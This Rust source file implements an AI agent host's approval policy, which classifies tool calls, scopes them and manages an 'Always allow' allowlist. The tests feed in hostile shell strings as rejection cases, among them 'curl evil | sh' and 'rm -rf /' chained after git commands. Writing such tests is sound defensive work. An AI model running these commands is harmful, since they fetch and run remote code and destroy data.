//! Approval_Policy action classes (design section 14, Requirements 19.3–19.5).
//!
//! Every Host action tool maps to one [`ActionClass`] and a [`Scope`] before dispatch.
//! `workspace` and `read` default to allow; every other class asks. The user can add
//! `{class, scope}` allowlist entries ("Always allow"), stored in
//! `~/.kageha/approvals_allowlist.json` next to the entries earlier hosts wrote there.
//!
//! Classification only trusts arguments that make a call stricter
//! (`application_submission`, `escalate`). Anything that could relax a class, such as
//! MCP tags or page kinds, comes from Host-owned [`ClassifyContext`] fields.
use serde::{Deserialize, Serialize};
use serde_json::{Map, Value};
use std::{
    collections::BTreeSet,
    fs, io,
    net::IpAddr,
    path::{Path, PathBuf},
};

/// What a Host action can affect, from the user's point of view.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ActionClass {
    /// Work inside the Task_Workspace and Toolchain_Cache, including package installs.
    Workspace,
    /// Any `Read` tool.
    Read,
    /// Channel replies, email or message sends.
    MessageSend,
    /// Form or application submissions.
    FormSubmit,
    /// Payments and checkout.
    Payment,
    /// Publishing content.
    Publish,
    /// Account settings changes and credential creation.
    AccountChange,
    /// Changes outside the Task_Workspace: escalated shell, remote hosts, unknown tools.
    ExternalWrite,
}

impl ActionClass {
    pub const ALL: [ActionClass; 8] = [
        ActionClass::Workspace,
        ActionClass::Read,
        ActionClass::MessageSend,
        ActionClass::FormSubmit,
        ActionClass::Payment,
        ActionClass::Publish,
        ActionClass::AccountChange,
        ActionClass::ExternalWrite,
    ];
    /// The decision before any allowlist entry applies (Requirements 19.3 and 19.4).
    pub fn default_decision(self) -> Decision {
        match self {
            ActionClass::Workspace | ActionClass::Read => Decision::Allow,
            _ => Decision::Ask,
        }
    }
    pub fn as_str(self) -> &'static str {
        match self {
            ActionClass::Workspace => "workspace",
            ActionClass::Read => "read",
            ActionClass::MessageSend => "message_send",
            ActionClass::FormSubmit => "form_submit",
            ActionClass::Payment => "payment",
            ActionClass::Publish => "publish",
            ActionClass::AccountChange => "account_change",
            ActionClass::ExternalWrite => "external_write",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Decision {
    Allow,
    Ask,
}

/// What an allowlist entry or a classified call is limited to.
///
/// Matching (see [`Scope::covers`]): `domain` also matches subdomains, `command` matches
/// on word boundaries, and the other kinds match exactly. Different kinds never match.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Scope {
    /// A web host, lowercase, without port or trailing dot.
    Domain(String),
    /// A connector or channel id.
    Connector(String),
    /// An MCP tool, `server/tool` for `mcp_call` or the Host tool name for `mcp_*` tools.
    McpTool(String),
    /// The first word(s) of a simple shell command. Compound commands keep their full
    /// text and never match any entry.
    Command(String),
    /// A Host tool with no narrower scope.
    Tool(String),
}

const COMPOUND: &[char] = &[
    ';', '&', '|', '<', '>', '`', '$', '(', ')', '{', '}', '\n', '\r', '\\', '*', '?', '~',
];

impl Scope {
    fn value(&self) -> &str {
        match self {
            Scope::Domain(v)
            | Scope::Connector(v)
            | Scope::McpTool(v)
            | Scope::Command(v)
            | Scope::Tool(v) => v,
        }
    }
    /// Whether an allowlist entry with this scope covers `candidate`.
    pub fn covers(&self, candidate: &Scope) -> bool {
        if !valid_text(self.value()) || !valid_text(candidate.value()) {
            return false;
        }
        match (self, candidate) {
            (Scope::Domain(entry), Scope::Domain(host)) => {
                let (Some(entry), Some(host)) = (normalize_host(entry), normalize_host(host)) else {
                    return false;
                };
                // An IP address has no subdomains and no parent domain: `0.0.1` must not
                // cover `10.0.0.1`.
                let is_ip = |h: &str| h.parse::<IpAddr>().is_ok() || h.starts_with('[');
                if is_ip(&entry) || is_ip(&host) {
                    return entry == host;
                }
                host == entry || host.ends_with(&format!(".{entry}"))
            }
            (Scope::Command(entry), Scope::Command(command)) => {
                if !simple_command(entry) || !simple_command(command) {
                    return false;
                }
                let entry: Vec<&str> = entry.split_whitespace().collect();
                let command: Vec<&str> = command.split_whitespace().collect();
                !entry.is_empty() && command.starts_with(&entry)
            }
            (Scope::Connector(a), Scope::Connector(b))
            | (Scope::McpTool(a), Scope::McpTool(b))
            | (Scope::Tool(a), Scope::Tool(b)) => a == b,
            _ => false,
        }
    }
    /// Whether this scope can be stored as an allowlist entry.
    pub fn storable(&self) -> bool {
        valid_text(self.value())
            && match self {
                Scope::Domain(v) => normalize_host(v).as_deref() == Some(v.as_str()),
                Scope::Command(v) => simple_command(v),
                _ => true,
            }
    }
}

fn valid_text(value: &str) -> bool {
    !value.trim().is_empty() && value.len() <= 512 && !value.chars().any(char::is_control)
}

/// A command whose prefix says what runs: no shell operators, expansions or a leading
/// environment assignment that could change what the first word does.
fn simple_command(command: &str) -> bool {
    let first = command.split_whitespace().next();
    first.is_some()
        && !command.contains(COMPOUND)
        && !command.contains(['"', '\''])
        && !first.is_some_and(|w| w.contains('='))
}

/// `git push origin main` -> `git push`; `ls -la` -> `ls`; `python run.py` -> `python`.
/// Compound commands keep their full text, which [`Scope::covers`] never matches.
pub fn command_scope(command: &str) -> Scope {
    let words: Vec<&str> = command.split_whitespace().collect();
    if !simple_command(command) {
        return Scope::Command(words.join(" "));
    }
    let subcommand = words.get(1).filter(|w| {
        w.len() <= 32
            && w.starts_with(|c: char| c.is_ascii_lowercase())
            && w.chars().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-' || c == '_')
    });
    Scope::Command(match subcommand {
        Some(sub) => format!("{} {sub}", words[0]),
        None => words[0].to_owned(),
    })
}

fn normalize_host(host: &str) -> Option<String> {
    let host = host.trim().trim_end_matches('.').to_ascii_lowercase();
    let valid = if host.starts_with('[') {
        host.ends_with(']') && host[1..host.len() - 1].parse::<IpAddr>().is_ok()
    } else {
        !host.is_empty()
            && host.split('.').all(|label| {
                !label.is_empty()
                    && label.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
            })
    };
    valid.then_some(host)
}

/// The host of a URL (or of a bare host), lowercase, without userinfo or port.
pub fn domain_of(url: &str) -> Option<String> {
    let rest = url.trim();
    let rest = rest.split_once("://").map_or(rest, |(_, rest)| rest);
    let authority = rest.split(['/', '?', '#']).next()?;
    let authority = authority.rsplit_once('@').map_or(authority, |(_, host)| host);
    let host = if authority.starts_with('[') {
        &authority[..=authority.find(']')?]
    } else {
        authority.split(':').next()?
    };
    normalize_host(host)
}

/// Host-owned facts about a call. The model never sets these.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct ClassifyContext {
    /// The URL of the browser page the action targets.
    pub url: Option<String>,
    /// A file or shell call resolves outside the Task_Workspace and Toolchain_Cache.
    pub outside_workspace: bool,
    /// The click target is a known form submit control.
    pub submit_target: bool,
    /// The browser decision model detected a checkout page.
    pub checkout_page: bool,
    /// The page is an account settings page.
    pub settings_page: bool,
    /// Configured tags of an MCP or connector tool, such as `send`, `payment`,
    /// `publish` or `read`.
    pub tags: BTreeSet<String>,
    /// The connector or channel id the call writes to.
    pub connector: Option<String>,
    /// The remote host of `remote_exec` and `remote_upload`.
    pub remote_host: Option<String>,
}

/// Every `Read` tool of the Capability_Registry, plus `browser_validate`, which only
/// checks page state.
const READ_TOOLS: &[&str] = &[
    "read_file",
    "list_workspace_files",
    "find_past_files",
    "search_past_chats",
    "discover_capabilities",
    "load_skill",
    "skill_read",
    "knowledge_search",
    "knowledge_list",
    "memory_get",
    "memory_search",
    "web_search",
    "news_search",
    "web_fetch",
    "integration_read",
    "integration_check",
    "remote_receipts",
    "computer_info",
    "computer_permissions",
    "computer_apps",
    "computer_windows",
    "computer_activity",
    "computer_inspect",
    "computer_receipt",
    "computer_observe",
    "browser_open",
    "browser_tabs",
    "browser_snapshot",
    "browser_validate",
    "browser_inspect",
    "browser_receipts",
    "browser_reconcile",
    "browser_preview_status",
    "transcribe_audio",
    "agent_status",
    "agent_wait",
    "agent_wait_any",
];

/// Tools that only change the Task_Workspace or Host-owned task state.
const WORKSPACE_TOOLS: &[&str] = &[
    "write_file",
    "edit_file",
    "memory_put",
    "memory_delete",
    "text_to_speech",
    "generate_image",
    "ask_human",
    "agent_spawn",
    "agent_cancel",
    "computer_release",
    "record_required_outcomes",
    "amend_required_outcome",
    "record_outcome_evidence",
    "report_blocker",
    "task_plan_update",
    "task_plan_revise",
    "propose_run_change",
    "goal_update",
];

const MESSAGE_TOOLS: &[&str] = &[
    "channel_reply",
    "send_email",
    "email_send",
    "send_message",
    "message_send",
];

fn text<'a>(args: &'a Value, key: &str) -> Option<&'a str> {
    args.get(key).and_then(Value::as_str).filter(|s| !s.is_empty())
}

fn page_scope(tool: &str, args: &Value, context: &ClassifyContext) -> Scope {
    context
        .url
        .as_deref()
        .or_else(|| text(args, "url"))
        .and_then(domain_of)
        .map(Scope::Domain)
        .unwrap_or_else(|| Scope::Tool(tool.into()))
}

fn connector_scope(tool: &str, context: &ClassifyContext) -> Scope {
    context
        .connector
        .clone()
        .filter(|c| valid_text(c))
        .map(Scope::Connector)
        .unwrap_or_else(|| Scope::Tool(tool.into()))
}

fn tagged(context: &ClassifyContext) -> Option<ActionClass> {
    let has = |tag: &str| context.tags.contains(tag);
    if has("payment") {
        Some(ActionClass::Payment)
    } else if has("publish") {
        Some(ActionClass::Publish)
    } else if has("send") {
        Some(ActionClass::MessageSend)
    } else {
        None
    }
}

/// Maps a Host tool call to its action class and scope (design section 14).
/// Unknown tools get the strictest class, `external_write`, and are never allowed by default.
pub fn classify(tool: &str, args: &Value, context: &ClassifyContext) -> (ActionClass, Scope) {
    use ActionClass::*;
    match tool {
        "shell" | "bash" | "shell_job" => {
            let escalated = args.get("escalate").and_then(Value::as_bool) == Some(true);
            let class = if escalated || context.outside_workspace { ExternalWrite } else { Workspace };
            let scope = text(args, "command").map(command_scope).unwrap_or_else(|| Scope::Tool(tool.into()));
            (class, scope)
        }
        "write_file" | "edit_file" if context.outside_workspace => (ExternalWrite, Scope::Tool(tool.into())),
        "web_fetch" | "browser_open" => (Read, page_scope(tool, args, context)),
        "integration_read" | "integration_check" => (
            Read,
            text(args, "connector")
                .or(context.connector.as_deref())
                .filter(|c| valid_text(c))
                .map(|c| Scope::Connector(c.into()))
                .unwrap_or_else(|| Scope::Tool(tool.into())),
        ),
        _ if READ_TOOLS.contains(&tool) => (Read, Scope::Tool(tool.into())),
        _ if WORKSPACE_TOOLS.contains(&tool) => (Workspace, Scope::Tool(tool.into())),
        _ if MESSAGE_TOOLS.contains(&tool) => (MessageSend, connector_scope(tool, context)),
        "remote_exec" => (
            ExternalWrite,
            text(args, "command").map(command_scope).unwrap_or_else(|| Scope::Tool(tool.into())),
        ),
        "remote_upload" => (
            ExternalWrite,
            context
                .remote_host
                .as_deref()
                .and_then(domain_of)
                .map(Scope::Domain)
                .unwrap_or_else(|| Scope::Tool(tool.into())),
        ),
        "browser_credential" => (AccountChange, page_scope(tool, args, context)),
        "browser_click" | "browser_press" | "browser_reload" | "browser_navigate" | "browser_close" | "browser_fill" | "browser_fill_credential"
        | "browser_select" | "browser_check" | "browser_upload" => {
            let scope = page_scope(tool, args, context);
            let submits = args.get("application_submission").and_then(Value::as_bool) == Some(true)
                || context.submit_target;
            let class = if context.checkout_page {
                Payment
            } else if context.settings_page {
                AccountChange
            } else if submits {
                FormSubmit
            } else {
                match tool {
                    // Draft input stays on the page until a submit, which asks on its own.
                    "browser_fill" | "browser_fill_credential" | "browser_select" | "browser_check" => Workspace,
                    // A click or key press can trigger effects the Host can't see.
                    _ => ExternalWrite,
                }
            };
            (class, scope)
        }
        "mcp_call" => {
            let scope = match (text(args, "server"), text(args, "tool")) {
                (Some(server), Some(name)) => Scope::McpTool(format!("{server}/{name}")),
                _ => Scope::Tool(tool.into()),
            };
            (mcp_class(context), scope)
        }
        _ if tool.starts_with("mcp_") => (mcp_class(context), Scope::McpTool(tool.into())),
        _ => (tagged(context).unwrap_or(ExternalWrite), connector_scope(tool, context)),
    }
}

fn mcp_class(context: &ClassifyContext) -> ActionClass {
    tagged(context).unwrap_or(if context.tags.contains("read") {
        ActionClass::Read
    } else {
        ActionClass::ExternalWrite
    })
}

/// One "Always allow" grant.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
pub struct AllowEntry {
    pub class: ActionClass,
    pub scope: Scope,
}

impl AllowEntry {
    pub fn covers(&self, class: ActionClass, scope: &Scope) -> bool {
        self.class == class && self.scope.covers(scope)
    }
}

/// Top-level key of the versioned section this host owns. Earlier hosts wrote
/// `{"entries": ["action|risk|detail", ...]}` or a bare list; those stay untouched.
pub const SECTION: &str = "action_classes";
pub const SECTION_VERSION: u64 = 1;
pub const ALLOWLIST_FILE: &str = "approvals_allowlist.json";

/// The contents of `approvals_allowlist.json`.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct Allowlist {
    entries: Vec<AllowEntry>,
    /// Legacy `entries` values, kept verbatim. They don't grant anything here.
    legacy: Vec<Value>,
    /// Class entries this version can't read, kept verbatim.
    unparsed: Vec<Value>,
    version: u64,
    /// Other top-level keys, kept verbatim.
    other: Map<String, Value>,
}

/// `$KAGEHA_HOME/approvals_allowlist.json`, or `~/.kageha/approvals_allowlist.json`.
pub fn default_allowlist_path() -> Option<PathBuf> {
    std::env::var_os("KAGEHA_HOME")
        .filter(|v| !v.is_empty())
        .map(PathBuf::from)
        .or_else(|| std::env::var_os("HOME").map(|h| PathBuf::from(h).join(".kageha")))
        .map(|home| home.join(ALLOWLIST_FILE))
}

fn invalid(message: &str) -> io::Error {
    io::Error::new(io::ErrorKind::InvalidData, message.to_owned())
}

impl Allowlist {
    pub fn entries(&self) -> &[AllowEntry] {
        &self.entries
    }
    pub fn legacy(&self) -> &[Value] {
        &self.legacy
    }
    /// Parses the file contents. A list or an object with `entries` is the legacy
    /// format; the `action_classes` section holds `{class, scope}` entries.
    pub fn parse(value: Value) -> io::Result<Self> {
        let mut list = Allowlist::default();
        match value {
            Value::Array(items) => list.legacy = items,
            Value::Object(mut object) => {
                if let Some(Value::Array(items)) = object.get("entries") {
                    list.legacy = items.clone();
                    object.remove("entries");
                }
                match object.remove(SECTION) {
                    None => {}
                    Some(Value::Object(section)) => {
                        list.version = section.get("version").and_then(Value::as_u64).unwrap_or(SECTION_VERSION);
                        match section.get("entries") {
                            None => {}
                            Some(Value::Array(items)) => {
                                for item in items {
                                    match serde_json::from_value::<AllowEntry>(item.clone()) {
                                        Ok(entry) if entry.scope.storable() => list.entries.push(entry),
                                        _ => list.unparsed.push(item.clone()),
                                    }
                                }
                            }
                            Some(_) => return Err(invalid("Allowlist action class entries must be a list")),
                        }
                    }
                    Some(_) => return Err(invalid("Allowlist action class section must be an object")),
                }
                list.other = object;
            }
            _ => return Err(invalid("Allowlist must be a list or an object")),
        }
        Ok(list)
    }
    pub fn to_value(&self) -> Value {
        let mut object = self.other.clone();
        if !self.legacy.is_empty() || !object.contains_key("entries") {
            object.insert("entries".into(), Value::Array(self.legacy.clone()));
        }
        let mut entries: Vec<Value> = self
            .entries
            .iter()
            .map(|e| serde_json::to_value(e).expect("allowlist entries serialize"))
            .collect();
        entries.extend(self.unparsed.iter().cloned());
        object.insert(
            SECTION.into(),
            serde_json::json!({"version": self.version.max(SECTION_VERSION), "entries": entries}),
        );
        Value::Object(object)
    }
    /// A missing file is an empty allowlist. A file that doesn't parse is an error, so
    /// callers never overwrite it.
    pub fn load(path: &Path) -> io::Result<Self> {
        match fs::read(path) {
            Ok(bytes) => Self::parse(serde_json::from_slice(&bytes).map_err(|_| invalid("Allowlist is not valid JSON"))?),
            Err(e) if e.kind() == io::ErrorKind::NotFound => Ok(Self::default()),
            Err(e) => Err(e),
        }
    }
    /// Writes atomically with mode 0600.
    pub fn save(&self, path: &Path) -> io::Result<()> {
        let parent = path.parent().filter(|p| !p.as_os_str().is_empty()).unwrap_or(Path::new("."));
        fs::create_dir_all(parent)?;
        let temporary = parent.join(format!(".{ALLOWLIST_FILE}.{}.tmp", uuid::Uuid::new_v4()));
        let mut bytes = serde_json::to_vec_pretty(&self.to_value())?;
        bytes.push(b'\n');
        let written = (|| {
            let mut options = fs::OpenOptions::new();
            options.write(true).create_new(true);
            #[cfg(unix)]
            std::os::unix::fs::OpenOptionsExt::mode(&mut options, 0o600);
            let mut file = options.open(&temporary)?;
            io::Write::write_all(&mut file, &bytes)?;
            file.sync_all()?;
            fs::rename(&temporary, path)
        })();
        if written.is_err() {
            let _ = fs::remove_file(&temporary);
        }
        written
    }
    pub fn allows(&self, class: ActionClass, scope: &Scope) -> bool {
        self.entries.iter().any(|entry| entry.covers(class, scope))
    }
    /// Adds an entry in memory. Returns false when the entry is redundant: its class
    /// already defaults to allow, or the same entry exists.
    pub fn insert(&mut self, entry: AllowEntry) -> io::Result<bool> {
        if !entry.scope.storable() {
            return Err(io::Error::new(io::ErrorKind::InvalidInput, "This action can't be added to the allowlist"));
        }
        if entry.class.default_decision() == Decision::Allow || self.entries.contains(&entry) {
            return Ok(false);
        }
        self.entries.push(entry);
        Ok(true)
    }
}

/// The Approval_Policy decision for one classified call. Delegated workers inherit the
/// parent's policy and allowlist, so they get the same decision.
pub fn decide(class: ActionClass, scope: &Scope, allowlist: &Allowlist, is_delegated_worker: bool) -> Decision {
    let _inherits = is_delegated_worker;
    if class.default_decision() == Decision::Allow || allowlist.allows(class, scope) {
        Decision::Allow
    } else {
        Decision::Ask
    }
}

/// Adds an "Always allow" entry to the allowlist file. Delegated workers can't add
/// entries (`docs/AGENTS.md`). Returns false when the entry was redundant.
pub fn add_allow(path: &Path, entry: AllowEntry, is_delegated_worker: bool) -> io::Result<bool> {
    if is_delegated_worker {
        return Err(io::Error::new(
            io::ErrorKind::PermissionDenied,
            "Delegated workers can't add Approval_Policy allowlist entries",
        ));
    }
    if !entry.scope.storable() {
        return Err(io::Error::new(io::ErrorKind::InvalidInput, "This action can't be added to the allowlist"));
    }
    let parent = path.parent().filter(|p| !p.as_os_str().is_empty()).unwrap_or(Path::new("."));
    fs::create_dir_all(parent)?;
    let lock = fs::OpenOptions::new()
        .create(true)
        .truncate(false)
        .write(true)
        .open(parent.join(format!(".{ALLOWLIST_FILE}.lock")))?;
    fs2::FileExt::lock_exclusive(&lock)?;
    let result = (|| {
        let mut list = Allowlist::load(path)?;
        if !list.insert(entry)? {
            return Ok(false);
        }
        list.save(path)?;
        Ok(true)
    })();
    let _ = fs2::FileExt::unlock(&lock);
    result
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;
    use ActionClass::*;

    fn ctx() -> ClassifyContext {
        ClassifyContext::default()
    }
    fn class(tool: &str, args: Value, context: &ClassifyContext) -> ActionClass {
        classify(tool, &args, context).0
    }
    fn tagged_ctx(tag: &str) -> ClassifyContext {
        ClassifyContext { tags: [tag.to_owned()].into(), ..ctx() }
    }
    fn page(url: &str) -> ClassifyContext {
        ClassifyContext { url: Some(url.into()), ..ctx() }
    }

    #[test]
    fn defaults_allow_only_workspace_and_read() {
        for c in ActionClass::ALL {
            let expected = if matches!(c, Workspace | Read) { Decision::Allow } else { Decision::Ask };
            assert_eq!(c.default_decision(), expected, "{c:?}");
            assert_eq!(decide(c, &Scope::Tool("x".into()), &Allowlist::default(), false), expected);
        }
    }

    #[test]
    fn file_and_sandboxed_shell_tools_are_workspace() {
        for tool in ["write_file", "edit_file", "shell", "bash", "shell_job"] {
            assert_eq!(class(tool, json!({"command":"uv pip install pdfplumber"}), &ctx()), Workspace, "{tool}");
        }
        let (c, scope) = classify("shell", &json!({"command":"uv pip install pdfplumber"}), &ctx());
        assert_eq!((c, scope), (Workspace, Scope::Command("uv pip".into())));
        let outside = ClassifyContext { outside_workspace: true, ..ctx() };
        assert_eq!(class("write_file", json!({}), &outside), ExternalWrite);
        assert_eq!(class("shell", json!({"command":"ls"}), &outside), ExternalWrite);
    }

    #[test]
    fn escalated_shell_and_remote_tools_are_external_writes() {
        assert_eq!(
            classify("shell", &json!({"command":"git push origin main","escalate":true}), &ctx()),
            (ExternalWrite, Scope::Command("git push".into()))
        );
        assert_eq!(
            classify("remote_exec", &json!({"command":"systemctl restart app"}), &ctx()),
            (ExternalWrite, Scope::Command("systemctl restart".into()))
        );
        let remote = ClassifyContext { remote_host: Some("Build.Example.com".into()), ..ctx() };
        assert_eq!(
            classify("remote_upload", &json!({}), &remote),
            (ExternalWrite, Scope::Domain("build.example.com".into()))
        );
        // `escalate: false` from the model can't relax an outside-workspace call.
        let outside = ClassifyContext { outside_workspace: true, ..ctx() };
        assert_eq!(class("shell", json!({"command":"ls","escalate":false}), &outside), ExternalWrite);
    }

    #[test]
    fn read_tools_are_read() {
        for tool in READ_TOOLS {
            assert_eq!(class(tool, json!({}), &ctx()), Read, "{tool}");
        }
        assert_eq!(
            classify("web_fetch", &json!({"url":"https://Docs.Example.com:8443/a?b"}), &ctx()),
            (Read, Scope::Domain("docs.example.com".into()))
        );
        assert_eq!(
            classify("integration_read", &json!({"connector":"gmail"}), &ctx()),
            (Read, Scope::Connector("gmail".into()))
        );
    }

    #[test]
    fn message_sends_are_message_send() {
        let slack = ClassifyContext { connector: Some("slack".into()), ..ctx() };
        assert_eq!(
            classify("channel_reply", &json!({"to":"c1","text":"hi"}), &slack),
            (MessageSend, Scope::Connector("slack".into()))
        );
        assert_eq!(class("send_email", json!({}), &ctx()), MessageSend);
        assert_eq!(
            classify("mcp_call", &json!({"server":"gmail","tool":"send"}), &tagged_ctx("send")),
            (MessageSend, Scope::McpTool("gmail/send".into()))
        );
        assert_eq!(class("mcp_gmail_send", json!({}), &tagged_ctx("send")), MessageSend);
    }

    #[test]
    fn browser_submissions_payments_and_settings() {
        let shop = page("https://shop.example.com/cart");
        assert_eq!(
            classify("browser_click", &json!({"application_submission":true}), &shop),
            (FormSubmit, Scope::Domain("shop.example.com".into()))
        );
        let submit = ClassifyContext { submit_target: true, ..shop.clone() };
        assert_eq!(class("browser_click", json!({}), &submit), FormSubmit);
        let checkout = ClassifyContext { checkout_page: true, ..submit.clone() };
        assert_eq!(class("browser_click", json!({"application_submission":true}), &checkout), Payment);
        assert_eq!(class("browser_fill", json!({}), &checkout), Payment);
        let settings = ClassifyContext { settings_page: true, ..shop.clone() };
        assert_eq!(class("browser_click", json!({}), &settings), AccountChange);
        assert_eq!(class("browser_fill_credential", json!({}), &settings), AccountChange);
        assert_eq!(class("browser_credential", json!({}), &shop), AccountChange);
        // Ordinary page: draft input is workspace-like, clicks and uploads ask.
        assert_eq!(class("browser_fill", json!({}), &shop), Workspace);
        assert_eq!(class("browser_click", json!({}), &shop), ExternalWrite);
        assert_eq!(class("browser_upload", json!({}), &shop), ExternalWrite);
        assert_eq!(class("mcp_call", json!({"server":"stripe","tool":"charge"}), &tagged_ctx("payment")), Payment);
    }

    #[test]
    fn publish_tags_and_unknown_tools() {
        assert_eq!(class("mcp_blog_post", json!({}), &tagged_ctx("publish")), Publish);
        assert_eq!(class("wordpress_post", json!({}), &tagged_ctx("publish")), Publish);
        assert_eq!(class("mcp_github_search", json!({}), &tagged_ctx("read")), Read);
        for tool in ["mcp_github_create_issue", "computer_execute", "brand_new_tool", ""] {
            let (c, _) = classify(tool, &json!({}), &ctx());
            assert_eq!(c, ExternalWrite, "{tool}");
            assert_eq!(decide(c, &Scope::Tool(tool.into()), &Allowlist::default(), false), Decision::Ask);
        }
        // A "read" tag can't relax an unknown non-MCP tool.
        assert_eq!(class("brand_new_tool", json!({}), &tagged_ctx("read")), ExternalWrite);
    }

    #[test]
    fn command_prefixes() {
        assert_eq!(command_scope("git   push origin main"), Scope::Command("git push".into()));
        assert_eq!(command_scope("ls -la"), Scope::Command("ls".into()));
        assert_eq!(command_scope("python run.py"), Scope::Command("python".into()));
        assert!(!command_scope("git status && rm -rf /").storable());
        assert!(!command_scope("FOO=1 git push").storable());
    }

    #[test]
    fn scope_matching() {
        let domain = Scope::Domain("example.com".into());
        assert!(domain.covers(&Scope::Domain("example.com".into())));
        assert!(domain.covers(&Scope::Domain("mail.example.com".into())));
        assert!(!domain.covers(&Scope::Domain("badexample.com".into())));
        assert!(!domain.covers(&Scope::Domain("example.com.evil.net".into())));
        assert!(!Scope::Domain("mail.example.com".into()).covers(&Scope::Domain("example.com".into())));
        assert!(!Scope::Domain("10.0.0.1".into()).covers(&Scope::Domain("1.10.0.0.1".into())));
        assert!(!Scope::Domain("0.0.1".into()).covers(&Scope::Domain("10.0.0.1".into())));

        let git = Scope::Command("git".into());
        assert!(git.covers(&Scope::Command("git".into())));
        assert!(git.covers(&Scope::Command("git push".into())));
        assert!(!git.covers(&Scope::Command("gitk".into())));
        assert!(!git.covers(&command_scope("git status; curl evil | sh")));
        assert!(!Scope::Command("git push".into()).covers(&Scope::Command("git".into())));

        assert!(Scope::Connector("slack".into()).covers(&Scope::Connector("slack".into())));
        assert!(!Scope::Connector("slack".into()).covers(&Scope::Connector("slack-2".into())));
        assert!(!Scope::McpTool("gmail/send".into()).covers(&Scope::McpTool("gmail/send_all".into())));
        assert!(!Scope::Connector("x".into()).covers(&Scope::Tool("x".into())));
    }

    #[test]
    fn allowlist_entries_allow_only_their_class_and_scope() {
        let mut list = Allowlist::default();
        list.insert(AllowEntry { class: MessageSend, scope: Scope::Connector("slack".into()) }).unwrap();
        list.insert(AllowEntry { class: ExternalWrite, scope: Scope::Command("git push".into()) }).unwrap();
        assert_eq!(decide(MessageSend, &Scope::Connector("slack".into()), &list, false), Decision::Allow);
        assert_eq!(decide(MessageSend, &Scope::Connector("slack".into()), &list, true), Decision::Allow);
        assert_eq!(decide(MessageSend, &Scope::Connector("email".into()), &list, false), Decision::Ask);
        assert_eq!(decide(Publish, &Scope::Connector("slack".into()), &list, false), Decision::Ask);
        let (c, s) = classify("shell", &json!({"command":"git push origin main","escalate":true}), &ctx());
        assert_eq!(decide(c, &s, &list, false), Decision::Allow);
        let (c, s) = classify("shell", &json!({"command":"git push && rm -rf ~","escalate":true}), &ctx());
        assert_eq!(decide(c, &s, &list, false), Decision::Ask);
        // Redundant and unstorable entries.
        assert!(!list.insert(AllowEntry { class: Read, scope: Scope::Tool("x".into()) }).unwrap());
        assert!(!list.insert(AllowEntry { class: MessageSend, scope: Scope::Connector("slack".into()) }).unwrap());
        assert!(list.insert(AllowEntry { class: ExternalWrite, scope: command_scope("a; b") }).is_err());
    }

    #[test]
    fn delegated_workers_cannot_add_entries() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join(ALLOWLIST_FILE);
        let entry = AllowEntry { class: MessageSend, scope: Scope::Connector("slack".into()) };
        let error = add_allow(&path, entry.clone(), true).unwrap_err();
        assert_eq!(error.kind(), io::ErrorKind::PermissionDenied);
        assert!(!path.exists());
        assert!(add_allow(&path, entry.clone(), false).unwrap());
        assert!(!add_allow(&path, entry.clone(), false).unwrap());
        assert!(Allowlist::load(&path).unwrap().allows(MessageSend, &Scope::Connector("slack".into())));
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            assert_eq!(fs::metadata(&path).unwrap().permissions().mode() & 0o777, 0o600);
        }
    }

    #[test]
    fn legacy_allowlist_files_keep_every_entry() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join(ALLOWLIST_FILE);
        let entry = AllowEntry { class: Publish, scope: Scope::Domain("blog.example.com".into()) };
        // Earlier hosts wrote `{"entries": [...]}` or a bare list of `action|risk|detail` keys.
        for legacy in [
            json!({"entries":["bash|shell_network|Command:\ncurl x"], "note":"kept"}),
            json!(["bash|safe|ls", 7]),
        ] {
            fs::write(&path, legacy.to_string()).unwrap();
            assert!(add_allow(&path, entry.clone(), false).unwrap());
            let saved: Value = serde_json::from_slice(&fs::read(&path).unwrap()).unwrap();
            let old = match &legacy { Value::Array(items) => items.clone(), v => v["entries"].as_array().unwrap().clone() };
            assert_eq!(saved["entries"].as_array().unwrap(), &old);
            if legacy.is_object() {
                assert_eq!(saved["note"], "kept");
            }
            assert_eq!(saved[SECTION]["version"], SECTION_VERSION);
            assert_eq!(saved[SECTION]["entries"], json!([{"class":"publish","scope":{"domain":"blog.example.com"}}]));
        }
        // Entries a newer version wrote are kept even when this version can't read them.
        fs::write(&path, json!({"entries":[],SECTION:{"version":2,"entries":[{"class":"teleport","scope":{"planet":"mars"}}]}}).to_string()).unwrap();
        assert!(add_allow(&path, entry.clone(), false).unwrap());
        let saved: Value = serde_json::from_slice(&fs::read(&path).unwrap()).unwrap();
        assert_eq!(saved[SECTION]["version"], 2);
        assert_eq!(saved[SECTION]["entries"].as_array().unwrap().len(), 2);
        // A file that isn't valid JSON is never overwritten.
        fs::write(&path, "{not json").unwrap();
        assert!(add_allow(&path, entry, false).is_err());
        assert_eq!(fs::read_to_string(&path).unwrap(), "{not json");
        // A missing file is an empty allowlist.
        assert_eq!(Allowlist::load(&dir.path().join("missing.json")).unwrap(), Allowlist::default());
    }
}
